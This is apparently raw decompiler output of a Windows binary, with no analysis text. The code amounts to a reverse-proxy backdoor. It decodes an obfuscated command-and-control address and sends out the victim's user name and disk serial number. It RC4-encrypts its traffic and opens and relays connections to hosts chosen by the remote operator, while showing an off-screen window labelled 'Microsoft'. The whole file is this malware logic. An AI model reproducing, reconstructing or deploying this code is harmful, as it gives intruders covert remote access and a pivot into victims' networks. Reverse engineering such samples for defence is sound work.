/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void __noreturn start(); // weak
// void __usercall __noreturn sub_40102B(UINT a1@<eax>);
void __stdcall __noreturn sub_401031(int a1, int a2, int a3, int a4);
DWORD __stdcall sub_40106C(char *lpThreadParameter);
int __stdcall sub_4013DB(int *a1, u_short hostshort);
void __stdcall __spoils<ecx> sub_401926(int a1, int a2, _BYTE *a3, int a4);
void __stdcall __noreturn StartAddress(LRESULT (__stdcall *lpThreadParameter)(HWND, UINT, WPARAM, LPARAM));
void __stdcall sub_401BD2(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
int __stdcall sub_401BFF(SOCKET s, char *buf, int len, HANDLE hHandle); // idb
int __stdcall sub_401C86(SOCKET s, char *buf, int len, int a4); // idb
int __stdcall sub_401CD9(PCSTR pNodeName, int a2); // idb
void __stdcall sub_401D65(const void *a1, void *a2, unsigned int a3);
int __stdcall sub_401D7D(unsigned __int8 *a1);
int __stdcall sub_401DB2(int a1, int a2, _DWORD *a3, int a4, int a5);
int __stdcall sub_401DEC(void *a1, unsigned int a2);
void __fastcall __spoils<ecx> sub_401E03(int a1, _BYTE *a2, int *a3, unsigned int a4, _BYTE *a5);
int __stdcall sub_401EFB(_BYTE *a1);
void __noreturn sub_401F92(void); // weak
void __noreturn sub_402045(); // weak
// HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// LRESULT __stdcall DefWindowProcA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// LRESULT __stdcall DispatchMessageA(const MSG *lpMsg);
// BOOL __stdcall GetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// HCURSOR __stdcall LoadCursorA(HINSTANCE hInstance, LPCSTR lpCursorName);
// HICON __stdcall LoadIconA(HINSTANCE hInstance, LPCSTR lpIconName);
// void __stdcall PostQuitMessage(int nExitCode);
// ATOM __stdcall RegisterClassA(const WNDCLASSA *lpWndClass);
// BOOL __stdcall ShowWindow(HWND hWnd, int nCmdShow);
// BOOL __stdcall TranslateMessage(const MSG *lpMsg);
// BOOL __stdcall UpdateWindow(HWND hWnd);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// LPSTR __stdcall GetCommandLineA();
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// BOOL __stdcall GetVolumeInformationA(LPCSTR lpRootPathName, LPSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize);
// BOOL __stdcall SetEvent(HANDLE hEvent);
// void __stdcall Sleep(DWORD dwMilliseconds);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// int __stdcall closesocket(SOCKET s);
// int __stdcall connect(SOCKET s, const struct sockaddr *name, int namelen);
// u_short __stdcall htons(u_short hostshort);
// int __stdcall ioctlsocket(SOCKET s, int cmd, u_long *argp);
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// int __stdcall select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// int __stdcall setsockopt(SOCKET s, int level, int optname, const char *optval, int optlen);
// int __stdcall shutdown(SOCKET s, int how);
// SOCKET __stdcall socket(int af, int type, int protocol);
// int __stdcall WSAIoctl(SOCKET s, DWORD dwIoControlCode, LPVOID lpvInBuffer, DWORD cbInBuffer, LPVOID lpvOutBuffer, DWORD cbOutBuffer, LPDWORD lpcbBytesReturned, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);
// void __stdcall freeaddrinfo(PADDRINFOA pAddrInfo);
// INT __stdcall getaddrinfo(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult);
// BOOLEAN __stdcall GetUserNameExA(EXTENDED_NAME_FORMAT NameFormat, LPSTR lpNameBuffer, PULONG nSize);

//-------------------------------------------------------------------------
// Data declarations

int dword_404000[4] = { -1948389203, -674043091, -260190942, 1199366585 }; // weak
_UNKNOWN unk_404010; // weak
_UNKNOWN unk_404041; // weak
int dword_404072 = -1551211695; // weak
int dword_404078 = -1030048273; // weak
int dword_40407C = -2087473309; // weak
char aWin32app[9] = "win32app"; // weak
char aMicrosoft[10] = "Microsoft"; // weak
int dword_4040C5 = 0; // weak
int dword_4040C9 = 0; // weak


//----- (00401000) --------------------------------------------------------
void __noreturn start()
{
  dword_4040C9 = (int)GetModuleHandleA(0);
  dword_4040C5 = (int)GetCommandLineA();
  sub_401031(dword_4040C9, 0, dword_4040C5, 10);
}
// 401000: using guessed type void __noreturn start();
// 4040C5: using guessed type int dword_4040C5;
// 4040C9: using guessed type int dword_4040C9;

//----- (0040102B) --------------------------------------------------------
void __usercall __noreturn sub_40102B(UINT a1@<eax>)
{
  ExitProcess(a1);
}

//----- (00401031) --------------------------------------------------------
void __stdcall __noreturn sub_401031(int a1, int a2, int a3, int a4)
{
  char v4[1024]; // [esp+0h] [ebp-400h] BYREF
  char vars0; // [esp+400h] [ebp+0h] BYREF

  sub_401DEC(v4, &vars0 - v4);
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, sub_401BD2, 0, 0);
  sub_401F92();
}
// 401F92: using guessed type void __noreturn sub_401F92(void);

//----- (0040106C) --------------------------------------------------------
DWORD __stdcall sub_40106C(char *lpThreadParameter)
{
  int v1; // ecx
  int v2; // eax
  SOCKET *v3; // esi
  int v4; // ebx
  int v5; // edi
  char *v6; // edi
  int v7; // eax
  int v8; // eax
  int v9; // ecx
  int v10; // ecx
  int v12; // [esp+0h] [ebp-90h] BYREF
  DWORD cbBytesReturned; // [esp+Ch] [ebp-84h] BYREF
  int vInBuffer[3]; // [esp+10h] [ebp-80h] BYREF
  u_long argp; // [esp+1Ch] [ebp-74h] BYREF
  _DWORD v16[3]; // [esp+20h] [ebp-70h] BYREF
  struct timeval timeout; // [esp+2Ch] [ebp-64h] BYREF
  struct sockaddr v18; // [esp+34h] [ebp-5Ch] BYREF
  int v19; // [esp+4Ch] [ebp-44h]
  struct sockaddr name; // [esp+50h] [ebp-40h] BYREF
  char buf; // [esp+60h] [ebp-30h] BYREF
  unsigned __int16 v22; // [esp+61h] [ebp-2Fh]
  char v23; // [esp+63h] [ebp-2Dh] BYREF
  char v24; // [esp+64h] [ebp-2Ch]
  char v25; // [esp+65h] [ebp-2Bh]
  char v26; // [esp+66h] [ebp-2Ah]
  char v27; // [esp+67h] [ebp-29h]
  char v28; // [esp+68h] [ebp-28h]
  char v29; // [esp+69h] [ebp-27h]
  char v30; // [esp+6Ah] [ebp-26h]
  char v31; // [esp+6Bh] [ebp-25h]
  char v32; // [esp+6Ch] [ebp-24h]
  int v33; // [esp+74h] [ebp-1Ch] BYREF
  SOCKET s; // [esp+78h] [ebp-18h]
  HANDLE hHandle; // [esp+7Ch] [ebp-14h] BYREF
  LPVOID lpAddress; // [esp+80h] [ebp-10h] BYREF
  int v37; // [esp+84h] [ebp-Ch] BYREF
  SOCKET v38; // [esp+88h] [ebp-8h]
  SOCKET *v39; // [esp+8Ch] [ebp-4h] BYREF

  sub_401DEC(&cbBytesReturned, (char *)&v37 - (char *)&v12);
  sub_401D65(lpThreadParameter + 384, &v33, 4u);
  sub_401D65(lpThreadParameter + 388, &v37, 4u);
  sub_401D65(lpThreadParameter + 392, &hHandle, 4u);
  sub_401D65(lpThreadParameter + 396, &v39, 4u);
  sub_401D65(lpThreadParameter + 400, &lpAddress, 4u);
  s = v39[v37];
  v38 = *v39;
  buf = v37;
  v22 = 10;
  v23 = 5;
  v24 = 1;
  v25 = 0;
  v26 = 1;
  v27 = 0;
  v28 = 0;
  v29 = 0;
  v30 = 0;
  v31 = 0;
  v32 = 0;
  name.sa_family = 2;
  switch ( lpThreadParameter[7] )
  {
    case 3:
      v1 = (unsigned __int8)lpThreadParameter[8];
      *(_WORD *)name.sa_data = *(_WORD *)&lpThreadParameter[v1 + 9];
      lpThreadParameter[v1 + 9] = 0;
      v2 = sub_401CD9(lpThreadParameter + 9, 2);
      if ( !v2 )
        goto LABEL_15;
      *(_DWORD *)&name.sa_data[2] = v2;
      break;
    case 1:
      *(_DWORD *)&name.sa_data[2] = *((_DWORD *)lpThreadParameter + 2);
      *(_WORD *)name.sa_data = *((_WORD *)lpThreadParameter + 6);
      break;
    case 4:
      v18.sa_family = 23;
      *(_DWORD *)&v18.sa_data[2] = 0;
      v19 = 0;
      *(_WORD *)v18.sa_data = *((_WORD *)lpThreadParameter + 12);
      sub_401D65(lpThreadParameter + 8, &v18.sa_data[6], 0x10u);
      break;
    default:
      goto LABEL_15;
  }
  argp = 1;
  if ( !ioctlsocket(s, -2147195266, &argp) )
  {
    if ( lpThreadParameter[7] == 4 )
      connect(s, &v18, 28);
    else
      connect(s, &name, 16);
    sub_401DB2(s, 0, v16, 10, 0);
    if ( select(0, 0, (fd_set *)v16, 0, &timeout) == 1 )
    {
      argp = 0;
      ioctlsocket(s, -2147195266, &argp);
      vInBuffer[0] = 1;
      vInBuffer[1] = 60000;
      vInBuffer[2] = 10000;
      WSAIoctl(s, 0x98000004, vInBuffer, 0xCu, 0, 0, &cbBytesReturned, 0, 0);
      v24 = 0;
    }
  }
LABEL_15:
  v3 = v39;
  v4 = v37;
  v5 = v22;
  sub_401926((int)&dword_404078, 50, &buf, 3);
  sub_401926((int)&dword_404078, 50, &v23, v5);
  sub_401BFF(v38, &buf, v5 + 3, hHandle);
  sub_401926((int)&dword_404078, 50, &buf, 3);
  sub_401926((int)&dword_404078, 50, &v23, v5);
  if ( !v24 )
  {
    v6 = (char *)lpAddress;
    while ( v3[v4] )
    {
      sub_401DB2(s, 0, v16, 0, 100);
      v7 = select(0, (fd_set *)v16, 0, 0, &timeout);
      if ( v7 )
      {
        if ( v7 < 0 )
          break;
        v8 = recv(s, v6 + 3, 65530, 0);
        if ( !v8 || v8 == -1 )
          break;
        *(_WORD *)(v6 + 1) = v8;
        *v6 = v37;
        sub_401926((int)&dword_404078, 50, v6, 3);
        sub_401926((int)&dword_404078, 50, v6 + 3, v9);
        sub_401BFF(v38, v6, v10 + 3, hHandle);
      }
    }
  }
  v3[v4] = 0;
  shutdown(s, 2);
  closesocket(s);
  v22 = 0;
  sub_401926((int)&dword_404078, 50, &buf, 3);
  sub_401BFF(v38, &buf, 3, hHandle);
  VirtualFree(lpAddress, 0, 0x8000u);
  *(_DWORD *)(v33 + 4 * v4) = 0;
  return 0;
}
// 401355: variable 'v9' is possibly undefined
// 401360: variable 'v10' is possibly undefined
// 404078: using guessed type int dword_404078;

//----- (004013DB) --------------------------------------------------------
int __stdcall sub_4013DB(int *a1, u_short hostshort)
{
  void *v2; // eax
  ULONG *v3; // eax
  PULONG v4; // edi
  _BYTE *v5; // edx
  int v6; // ecx
  int v7; // eax
  PULONG v8; // edi
  int v9; // ebx
  int v10; // eax
  unsigned int v11; // ecx
  int v12; // ecx
  int v13; // ebx
  _DWORD *v14; // eax
  _DWORD *v15; // esi
  SOCKET v16; // eax
  int v17; // eax
  unsigned int v18; // edx
  int v19; // edx
  SOCKET *v20; // esi
  int v21; // ebx
  bool v22; // zf
  int *v23; // edi
  int v24; // ecx
  int v26; // [esp+0h] [ebp-7ACh] BYREF
  CHAR pNodeName[256]; // [esp+Ch] [ebp-7A0h] BYREF
  int v28; // [esp+10Ch] [ebp-6A0h]
  int v29; // [esp+110h] [ebp-69Ch]
  DWORD cbBytesReturned; // [esp+118h] [ebp-694h] BYREF
  int vInBuffer[3]; // [esp+11Ch] [ebp-690h] BYREF
  char optval[4]; // [esp+128h] [ebp-684h] BYREF
  HANDLE hObject; // [esp+12Ch] [ebp-680h] BYREF
  int v34[200]; // [esp+130h] [ebp-67Ch] BYREF
  SOCKET s[200]; // [esp+450h] [ebp-35Ch] BYREF
  int v36; // [esp+770h] [ebp-3Ch]
  int v37; // [esp+774h] [ebp-38h]
  PULONG nSize; // [esp+778h] [ebp-34h]
  _DWORD v39[3]; // [esp+77Ch] [ebp-30h] BYREF
  struct timeval timeout; // [esp+788h] [ebp-24h] BYREF
  struct sockaddr name; // [esp+790h] [ebp-1Ch] BYREF
  char *v42; // [esp+7A0h] [ebp-Ch] BYREF
  unsigned int v43; // [esp+7A4h] [ebp-8h]
  LPVOID lpAddress; // [esp+7A8h] [ebp-4h] BYREF

  sub_401DEC(pNodeName, (char *)&v42 - (char *)&v26);
  v2 = VirtualAlloc(0, 0x10000u, 0x3000u, 4u);
  if ( !v2 )
    goto LABEL_44;
  lpAddress = v2;
  v3 = (ULONG *)VirtualAlloc(0, 0x10000u, 0x3000u, 4u);
  if ( !v3 )
    goto LABEL_44;
  nSize = v3;
  hObject = CreateEventA(0, 0, 1, 0);
  v4 = nSize;
  *nSize = 256;
  GetUserNameExA(NameSamCompatible, (LPSTR)v4 + 82, v4);
  s[0] = socket(2, 1, 6);
  *(_DWORD *)optval = 1;
  setsockopt(s[0], 6, 1, optval, 4);
  sub_401E03(v6, v5, a1, 0xFFFFFFFF, pNodeName);
  *(_DWORD *)&name.sa_data[2] = sub_401CD9(pNodeName, 2);
  *(_WORD *)name.sa_data = htons(hostshort);
  name.sa_family = 2;
  *(_DWORD *)optval = 1;
  ioctlsocket(s[0], -2147195266, (u_long *)optval);
  connect(s[0], &name, 16);
  sub_401DB2(s[0], 0, v39, 10, 0);
  if ( select(0, 0, (fd_set *)v39, 0, &timeout) != 1 )
    goto LABEL_44;
  *(_DWORD *)optval = 0;
  ioctlsocket(s[0], -2147195266, (u_long *)optval);
  vInBuffer[0] = 1;
  vInBuffer[1] = 600000;
  vInBuffer[2] = 10000;
  WSAIoctl(s[0], 0x98000004, vInBuffer, 0xCu, 0, 0, &cbBytesReturned, 0, 0);
  sub_401D65(&dword_404078, v4 + 7, 0x32u);
  *((_WORD *)v4 + 39) = 1;
  *((_BYTE *)v4 + 123) = 0;
  GetVolumeInformationA(0, 0, 0, v4 + 31, 0, 0, 0, 0);
  sub_401926((int)&dword_404078, 50, (_BYTE *)v4 + 78, 50);
  sub_401BFF(s[0], (char *)nSize + 28, 100, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( !v43 && v36 != 4 )
      {
        sub_401DB2(s[0], 0, v39, 120, 0);
        v7 = select(0, (fd_set *)v39, 0, 0, &timeout);
        if ( v7 < 0 )
          goto LABEL_44;
        if ( v7 )
          break;
        if ( v37 || v36 )
          goto LABEL_44;
        v29 = 1;
      }
      v8 = nSize;
      if ( v37 || v36 == 4 )
        break;
      if ( !v43 )
      {
        v17 = sub_401C86(s[0], (char *)lpAddress, 0x10000, 0);
        if ( v17 <= 0 )
          goto LABEL_44;
        v29 = 1;
        v43 = v17;
        sub_401D65(&lpAddress, &v42, 4u);
      }
      v18 = 4 - v36;
      if ( v43 < 4 - v36 )
        v18 = v43;
      sub_401D65(v42, (char *)v8 + v36, v18);
      v42 += v19;
      v43 -= v19;
      v36 += v19;
      if ( v36 == 4 )
        sub_401926((int)&dword_404078, 50, v8, 4);
    }
    if ( !*((_WORD *)nSize + 1) )
      break;
    if ( !v43 )
    {
      v10 = sub_401C86(s[0], (char *)lpAddress, 0x10000, 0);
      if ( v10 <= 0 )
        goto LABEL_44;
      v43 = v10;
      sub_401D65(&lpAddress, &v42, 4u);
    }
    v11 = *((unsigned __int16 *)v8 + 1) - v37;
    if ( v43 <= v11 )
      v11 = v43;
    sub_401D65(v42, (char *)v8 + v37 + 4, v11);
    v42 += v12;
    v43 -= v12;
    v37 += v12;
    if ( (_WORD)v37 == *((_WORD *)v8 + 1) )
    {
      sub_401926((int)&dword_404078, 50, (_BYTE *)v8 + 4, *((unsigned __int16 *)v8 + 1));
      v13 = *((unsigned __int8 *)v8 + 1);
      if ( *(_WORD *)v8 != 0xFFFF )
      {
        if ( *(_BYTE *)v8 )
        {
          sub_401BFF(s[v13], (char *)v8 + 4, *((unsigned __int16 *)v8 + 1), 0);
        }
        else
        {
          v14 = VirtualAlloc(0, 0x10000u, 0x3000u, 4u);
          if ( !v14 )
            goto LABEL_44;
          v15 = v14;
          sub_401D65(v8, v14, 0x180u);
          v15[96] = v34;
          v15[97] = v13;
          sub_401D65(&hObject, v15 + 98, 4u);
          v15[99] = s;
          v15[100] = v15;
          if ( *((_BYTE *)v15 + 7) == 4 )
            v16 = socket(23, 1, 6);
          else
            v16 = socket(2, 1, 6);
          s[v13] = v16;
          *(_DWORD *)optval = 1;
          setsockopt(s[v13], 6, 1, optval, 4);
          v34[v13] = (int)CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_40106C, v15, 0, 0);
        }
      }
      v37 = 0;
    }
LABEL_35:
    v36 = 0;
  }
  if ( *(_BYTE *)nSize != 0xFF || *((_BYTE *)nSize + 1) != 0xFE )
  {
    v9 = *((unsigned __int8 *)nSize + 1);
    if ( s[v9] )
      s[v9] = 0;
    goto LABEL_35;
  }
  v28 = 1;
LABEL_44:
  shutdown(s[0], 2);
  closesocket(s[0]);
  v20 = s;
  v21 = 200;
  do
  {
    *v20++ = 0;
    --v21;
  }
  while ( v21 );
  do
  {
    v22 = 1;
    v23 = v34;
    v24 = 200;
    do
    {
      if ( !v24 )
        break;
      v22 = *v23++ == 0;
      --v24;
    }
    while ( v22 );
  }
  while ( !v22 );
  CloseHandle(hObject);
  VirtualFree(lpAddress, 0, 0x8000u);
  VirtualFree(nSize, 0, 0x8000u);
  if ( v28 == 1 )
    ExitProcess(0);
  return v29;
}
// 40149A: variable 'v6' is possibly undefined
// 40149A: variable 'v5' is possibly undefined
// 4016F0: variable 'v12' is possibly undefined
// 40187D: variable 'v19' is possibly undefined
// 404078: using guessed type int dword_404078;
// 4013DB: using guessed type SOCKET s[200];
// 4013DB: using guessed type int var_67C[200];

//----- (00401926) --------------------------------------------------------
void __stdcall __spoils<ecx> sub_401926(int a1, int a2, _BYTE *a3, int a4)
{
  int v4; // ecx
  int v5; // ecx
  int v6; // esi
  char v7; // dl
  int v8; // eax
  int v9; // eax
  int v10; // ebx
  int v11; // ebx
  int v12; // eax
  _BYTE *v13; // esi
  int v14; // edi
  char v15; // dl
  char v17[1024]; // [esp+4h] [ebp-400h] BYREF

  sub_401DEC(v17, 0x400u);
  v8 = -66052;
  v5 = 64;
  do
  {
    *(_DWORD *)&v17[4 * v5 - 4] = v8;
    v8 -= 67372036;
    --v5;
  }
  while ( v5 );
  v12 = 0;
LABEL_14:
  v11 = 0;
  v6 = a2;
  while ( 1 )
  {
    v7 = v17[v5];
    LOBYTE(v12) = v7 + *(_BYTE *)(v11 + a1) + v12;
    v17[v5] = v17[v12];
    v17[v12] = v7;
    LOBYTE(v5) = v5 + 1;
    if ( !(_BYTE)v5 )
      break;
    LOBYTE(v11) = v11 + 1;
    if ( !--v6 )
      goto LABEL_14;
  }
  v14 = a4;
  v13 = a3;
  if ( a4 )
  {
    v9 = 0;
    v4 = 0;
    v10 = 0;
    do
    {
      LOBYTE(v10) = v10 + 1;
      v15 = v17[v10];
      LOBYTE(v9) = v15 + v9;
      LOBYTE(v4) = v17[v9];
      v17[v10] = v4;
      v17[v9] = v15;
      LOBYTE(v4) = v15 + v4;
      *v13++ ^= v17[v4];
      --v14;
    }
    while ( v14 );
    memset(v17, 0, 0x100u);
  }
}
// 401926: using guessed type char var_400[1024];

//----- (00401AB4) --------------------------------------------------------
void __stdcall __noreturn StartAddress(LRESULT (__stdcall *lpThreadParameter)(HWND, UINT, WPARAM, LPARAM))
{
  _BYTE *v1; // edx
  int v2; // ecx
  int v3; // ecx
  CHAR ClassName[256]; // [esp+0h] [ebp-24Ch] BYREF
  CHAR WindowName[256]; // [esp+100h] [ebp-14Ch] BYREF
  struct tagMSG Msg; // [esp+200h] [ebp-4Ch] BYREF
  HWND hWnd; // [esp+21Ch] [ebp-30h]
  WNDCLASSA WndClass; // [esp+220h] [ebp-2Ch] BYREF
  HINSTANCE hInstance; // [esp+248h] [ebp-4h]
  char vars0; // [esp+24Ch] [ebp+0h] BYREF

  sub_401DEC(ClassName, &vars0 - ClassName);
  sub_401E03(v2, v1, (int *)aMicrosoft, 0xAu, WindowName);
  sub_401E03(v3, v1, (int *)aWin32app, 9u, ClassName);
  hInstance = GetModuleHandleA(0);
  WndClass.style = 0;
  WndClass.lpfnWndProc = lpThreadParameter;
  WndClass.cbClsExtra = 0;
  WndClass.cbWndExtra = 0;
  WndClass.hInstance = hInstance;
  WndClass.lpszMenuName = 0;
  WndClass.lpszClassName = ClassName;
  WndClass.hIcon = LoadIconA(0, (LPCSTR)0x7F04);
  WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F01);
  WndClass.hbrBackground = (HBRUSH)6;
  RegisterClassA(&WndClass);
  hWnd = CreateWindowExA(0x80u, ClassName, WindowName, 0xC80000u, 4000, 4000, 500, 150, 0, 0, hInstance, 0);
  ShowWindow(hWnd, 1);
  UpdateWindow(hWnd);
  while ( 1 )
  {
    GetMessageA(&Msg, 0, 0, 0);
    TranslateMessage(&Msg);
    DispatchMessageA(&Msg);
  }
}
// 401ADB: variable 'v2' is possibly undefined
// 401ADB: variable 'v1' is possibly undefined
// 401AEE: variable 'v3' is possibly undefined

//----- (00401BD2) --------------------------------------------------------
void __stdcall sub_401BD2(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
  if ( Msg == 2 )
    PostQuitMessage(0);
  else
    DefWindowProcA(hWnd, Msg, wParam, lParam);
}

//----- (00401BFF) --------------------------------------------------------
int __stdcall sub_401BFF(SOCKET s, char *buf, int len, HANDLE hHandle)
{
  int v5; // eax
  _DWORD v7[5]; // [esp+Ch] [ebp-18h] BYREF
  int v8; // [esp+20h] [ebp-4h]

  v8 = 10;
  if ( hHandle )
    WaitForSingleObject(hHandle, 0xFFFFFFFF);
  do
  {
    if ( !len )
      break;
    sub_401DB2(s, 0, v7, 0, 0);
    if ( select(0, 0, (fd_set *)v7, 0, 0) != 1 )
      break;
    v5 = send(s, buf, len, 0);
    if ( v5 <= 0 )
      break;
    len -= v5;
    buf += v5;
    --v8;
  }
  while ( v8 );
  if ( hHandle )
    SetEvent(hHandle);
  return len;
}

//----- (00401C86) --------------------------------------------------------
int __stdcall sub_401C86(SOCKET s, char *buf, int len, int a4)
{
  struct timeval *p_timeout; // edx
  int result; // eax
  _DWORD v6[3]; // [esp+Ch] [ebp-14h] BYREF
  struct timeval timeout; // [esp+18h] [ebp-8h] BYREF

  sub_401DB2(s, 0, v6, a4, 0);
  p_timeout = &timeout;
  if ( !a4 )
    p_timeout = 0;
  result = select(0, (fd_set *)v6, 0, 0, p_timeout);
  if ( result == 1 )
    return recv(s, buf, len, 0);
  return result;
}

//----- (00401CD9) --------------------------------------------------------
int __stdcall sub_401CD9(PCSTR pNodeName, int a2)
{
  PADDRINFOA i; // esi
  int v4; // [esp+0h] [ebp-438h] BYREF
  int v5[258]; // [esp+Ch] [ebp-42Ch] BYREF
  PADDRINFOA ppResult; // [esp+414h] [ebp-24h] BYREF
  ADDRINFOA pHints; // [esp+418h] [ebp-20h] BYREF

  sub_401DEC(v5, (char *)&pHints.ai_canonname - (char *)&v4);
  sub_401DEC(&pHints, 0x20u);
  pHints.ai_family = a2;
  pHints.ai_socktype = 1;
  pHints.ai_protocol = 6;
  if ( !getaddrinfo(pNodeName, 0, &pHints, &ppResult) )
  {
    for ( i = ppResult; i; i = i->ai_next )
    {
      if ( a2 == 2 && i->ai_family == 2 )
      {
        v5[0] = *(_DWORD *)&i->ai_addr->sa_data[2];
        freeaddrinfo(ppResult);
        return v5[0];
      }
    }
  }
  return v5[0];
}
// 401CD9: using guessed type int var_42C[258];

//----- (00401D65) --------------------------------------------------------
void __stdcall sub_401D65(const void *a1, void *a2, unsigned int a3)
{
  qmemcpy(a2, a1, a3);
}

//----- (00401D7D) --------------------------------------------------------
int __stdcall sub_401D7D(unsigned __int8 *a1)
{
  int result; // eax
  int v3; // ebx

  for ( result = 0; ; result = v3 + 10 * result )
  {
    v3 = *a1++;
    if ( (unsigned __int8)v3 < 0x30u || (unsigned __int8)v3 > 0x39u )
      break;
    LOBYTE(v3) = v3 - 48;
  }
  return result;
}

//----- (00401DB2) --------------------------------------------------------
int __stdcall sub_401DB2(int a1, int a2, _DWORD *a3, int a4, int a5)
{
  *a3 = 0;
  if ( a2 )
    ++*a3;
  if ( a1 )
    ++*a3;
  a3[1] = a1;
  a3[2] = a2;
  a3[3] = a4;
  a3[4] = a5;
  return 1;
}

//----- (00401DEC) --------------------------------------------------------
int __stdcall sub_401DEC(void *a1, unsigned int a2)
{
  int result; // eax

  result = 0;
  memset(a1, 0, a2);
  return result;
}

//----- (00401E03) --------------------------------------------------------
void __fastcall __spoils<ecx> sub_401E03(int a1, _BYTE *a2, int *a3, unsigned int a4, _BYTE *a5)
{
  int *v5; // esi
  int *v6; // edi
  int v7; // ecx
  int v8; // ebx
  char v9; // al

  if ( a3 < dword_404000 || a3 > &dword_404078 || dword_404078 == 1685221240 && dword_40407C == 6386785 )
  {
    if ( a5 )
    {
      if ( !a4 || a4 == -1 )
        a4 = sub_401EFB(a3) + 1;
      sub_401D65(a3, a5, a4);
    }
  }
  else
  {
    v5 = &dword_404078;
    v6 = dword_404000;
    v7 = a4;
    if ( !a4 )
      v7 = sub_401EFB(a3) + 1;
LABEL_13:
    v8 = 40;
    while ( 1 )
    {
      v9 = *(_BYTE *)v5;
      v5 = (int *)((char *)v5 + 1);
      if ( a3 <= v6 )
      {
        if ( a5 )
        {
          a2 = a5;
          *a5 = v9;
          *a5++ ^= *(_BYTE *)v6;
        }
        else
        {
          *(_BYTE *)v6 ^= v9;
        }
        --v7;
        if ( a4 == -2 && (!a5 && !*(_WORD *)((char *)v6 - 1) || a5 && !*(_WORD *)(a2 - 1)) )
          break;
        if ( a4 == -1 && (!a5 && !*(_BYTE *)v6 || a5 && !*a2) )
          break;
      }
      v6 = (int *)((char *)v6 + 1);
      if ( !v7 )
        break;
      if ( !--v8 )
      {
        v5 = &dword_404078;
        goto LABEL_13;
      }
    }
  }
}
// 401EBF: variable 'a2' is possibly undefined
// 404000: using guessed type int dword_404000[4];
// 404078: using guessed type int dword_404078;
// 40407C: using guessed type int dword_40407C;

//----- (00401EFB) --------------------------------------------------------
int __stdcall sub_401EFB(_BYTE *a1)
{
  _BYTE *v1; // edi

  v1 = a1;
  while ( *v1++ != 0 )
    ;
  return v1 - a1 - 1;
}

//----- (00401F92) --------------------------------------------------------
void __noreturn sub_401F92()
{
  _BYTE *v0; // edx
  int v1; // ecx
  char v2[16]; // [esp+0h] [ebp-1B4h] BYREF
  u_short hostshort[2]; // [esp+10h] [ebp-1A4h]
  unsigned __int8 v4[8]; // [esp+14h] [ebp-1A0h] BYREF
  int v5; // [esp+1Ch] [ebp-198h]
  struct WSAData WSAData; // [esp+26h] [ebp-18Eh] BYREF

  sub_401DEC(v2, (char *)&WSAData.lpVendorInfo + 2 - v2);
  do
    Sleep(0x2710u);
  while ( WSAStartup(0x202u, &WSAData) );
  v5 = (int)&unk_404010;
  sub_401E03(v1, v0, &dword_404072, 0xFFFFFFFF, v4);
  *(_DWORD *)hostshort = sub_401D7D(v4);
  while ( 1 )
  {
    if ( sub_4013DB((int *)v5, hostshort[0]) )
    {
      Sleep(0x2BF20u);
    }
    else if ( (_UNKNOWN *)v5 == &unk_404010 )
    {
      v5 = (int)&unk_404041;
    }
    else
    {
      v5 = (int)&unk_404010;
    }
  }
}
// 401FE2: variable 'v1' is possibly undefined
// 401FE2: variable 'v0' is possibly undefined
// 401F92: using guessed type void __noreturn sub_401F92();
// 404072: using guessed type int dword_404072;

//----- (00402045) --------------------------------------------------------
void __noreturn sub_402045()
{
  ExitProcess(0);
}
// 402045: using guessed type void __noreturn sub_402045();

// nfuncs=62 queued=19 decompiled=19 lumina nreq=0 worse=0 better=0
// ALL OK, 19 function(s) have been successfully decompiled
